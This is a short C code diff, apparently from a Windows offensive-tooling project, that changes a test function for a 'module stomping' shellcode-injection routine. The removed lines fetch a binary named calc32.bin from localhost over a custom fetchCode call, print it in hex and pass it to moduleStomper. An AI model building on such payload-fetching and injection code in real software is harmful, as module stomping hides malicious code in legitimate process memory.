@@ -66,18 +66,6 @@ int main() {
 }
 
 void TestingStomp() {
-    unsigned char* buffer = NULL;
-    DWORD size = 0;
-    fetchCode("localhost", "/calc32.bin", 8000, &buffer, &size);
-
-    for (DWORD i = 0; i < size; ++i) {
-        printf("%02x ", (buffer)[i]);
-        if ((i + 1) % 16 == 0) {
-            printf("\n");
-        }
-    }
-    printf("\n");
-    // REACHING TESTING STOMPER CODE
-    moduleStomper(&buffer, size);
+    moduleStomper();
     exit(0);
 }
